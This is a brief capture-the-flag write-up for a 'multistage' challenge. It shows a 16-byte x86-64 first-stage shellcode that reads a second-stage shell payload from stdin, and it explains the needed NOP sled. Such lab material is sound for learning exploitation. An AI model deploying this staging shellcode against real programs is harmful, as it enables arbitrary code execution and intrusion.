# multistage
The goal is to "pop a shell just 16 bytes of shellcode" in order to read the flag.

## Context
- The shellcode is read from `stdin`.

## Approach
The idea is to use a multistage shellcode.

In the first stage we call the syscall read in order to read the second stage from stdin.
```{asm}
    xor rdi, rdi  ; clear rdi register (fd = 0)
    push rax      ; push value of rax into stack
    pop rsi       ; pop rax into rsi (in this way we are writing on top of the first stage)
    xor rax, rax  ; clear rax register (syscall number for read)
    push 100      ; push 100 on the stack (number of bytes to read)
    pop rdx       ; pop it into rdx 
    syscall
```

In the second stage, we simply pop a shell (refer to [back_to_shell](../back_to_shell/)).
- To ensure the correct execution we have to put a nopsled since the `rip` will point right after the first stage and we are writing at the beginning of the first stage. The nopsled must be at least of the dimension of the first stage.
